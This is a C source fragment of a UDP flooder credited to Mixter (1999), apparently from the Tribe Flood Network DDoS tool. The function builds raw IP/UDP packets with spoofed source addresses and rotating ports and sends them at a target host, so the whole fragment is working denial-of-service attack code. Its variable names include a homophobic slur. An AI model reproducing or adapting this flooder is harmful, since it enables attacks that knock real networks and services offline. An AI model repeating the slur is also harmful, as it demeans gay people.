/* td.c - teletubby flood network udp flooder
   (c) 1999 by Mixter - PRIVATE */

int fbi = 1, cia = 9999;

void
udp (u_long lamer)
{
  struct
    {
      struct iphdr ip;
      struct udphdr udp;
      u_char evil[1 + psize];
    }
  faggot;
  struct sockaddr_in llama;

  if (fbi++ > 9999)
    fbi = 1;
  if (cia-- < 1)
    cia = 9999;

  srandom ((time (NULL) + random ()));

  faggot.ip.ihl = 5;
  faggot.ip.version = 4;
  faggot.ip.tos = 0x00;
  faggot.ip.tot_len = htons (sizeof (faggot));
  faggot.ip.id = htons (random ());
  faggot.ip.frag_off = 0;
  faggot.ip.ttl = 0xff;
  faggot.ip.protocol = IPPROTO_UDP;
  faggot.ip.saddr = k00lip ();
  faggot.ip.daddr = lamer;
  faggot.ip.check = ip_sum (&faggot.ip, sizeof (faggot.ip));

  faggot.udp.source = htons (cia);
  faggot.udp.dest = htons (fbi);
  faggot.udp.len = htons (sizeof (faggot.udp) + sizeof (faggot.evil));

  llama.sin_family = AF_INET;
  llama.sin_addr.s_addr = lamer;

  sendto (rawsock, &faggot, sizeof (faggot), 0, &llama, sizeof (llama));
  WAITAMOMENT;
}
